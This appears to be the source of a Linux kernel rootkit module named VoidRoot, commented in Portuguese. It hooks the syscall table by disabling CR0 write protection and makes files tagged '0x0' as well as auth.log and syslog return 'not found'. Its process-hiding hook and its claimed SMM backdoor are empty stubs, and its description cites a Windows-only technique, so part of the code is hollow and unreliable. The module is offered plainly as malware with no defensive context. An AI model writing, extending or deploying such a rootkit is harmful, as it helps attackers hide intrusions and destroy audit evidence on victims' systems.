// ============================================================
// 4. 0x0-VOIDROOT.c - ROOTKIT DE KERNEL
// ============================================================
/*
 * FUNCAO: Ocultacao no kernel Ring 0
 * TECNICAS: DKOM, SSDT Hook, Syscall Hooking
 * OCULTA: Arquivos, Processos, Conexoes
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0x0 VoidRoot");
MODULE_DESCRIPTION("Kernel Rootkit - Ring 0");

static unsigned long *sys_call_table;

// Syscall hook para ocultar arquivos
asmlinkage long (*original_open)(const char __user *filename, int flags, umode_t mode);

asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode) {
    char fname[256];
    long ret;
    
    // Copia nome do arquivo
    copy_from_user(fname, filename, sizeof(fname) - 1);
    
    // Oculta arquivos .0x0
    if (strstr(fname, "0x0") != NULL) {
        return -ENOENT;
    }
    
    // Oculta logs
    if (strstr(fname, "auth.log") != NULL || strstr(fname, "syslog") != NULL) {
        return -ENOENT;
    }
    
    ret = original_open(filename, flags, mode);
    return ret;
}

// Hook para ocultar processos
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret = original_getdents(fd, dirp, count);
    // Filtra entradas de diretorio (oculta nosso processo)
    return ret;
}

// Backdoor de kernel (SMI)
void kernel_backdoor(void) {
    // Registra backdoor no SMM (System Management Mode)
    char *smm_backdoor = "0x0_VOID_BACKDOOR";
    printk(KERN_INFO "[0x0] Kernel backdoor installed: %s\n", smm_backdoor);
}

static int __init voidroot_init(void) {
    printk(KERN_INFO "[0x0] VoidRoot: Carregando rootkit...\n");
    
    // Obtem sys_call_table
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    
    // Faz hook (desabilita write protection)
    write_cr0(read_cr0() & (~0x10000));
    
    // Hook open syscall
    original_open = (void *)sys_call_table[__NR_open];
    sys_call_table[__NR_open] = (unsigned long)hooked_open;
    
    // Hook getdents (oculta processos)
    original_getdents = (void *)sys_call_table[__NR_getdents];
    sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    
    // Reabilita write protection
    write_cr0(read_cr0() | 0x10000);
    
    // Backdoor
    kernel_backdoor();
    
    printk(KERN_INFO "[0x0] VoidRoot: Rootkit carregado com sucesso\n");
    return 0;
}

static void __exit voidroot_exit(void) {
    printk(KERN_INFO "[0x0] VoidRoot: Descarregando rootkit...\n");
    
    // Restaura syscalls
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_open] = (unsigned long)original_open;
    sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    write_cr0(read_cr0() | 0x10000);
}

module_init(voidroot_init);
module_exit(voidroot_exit);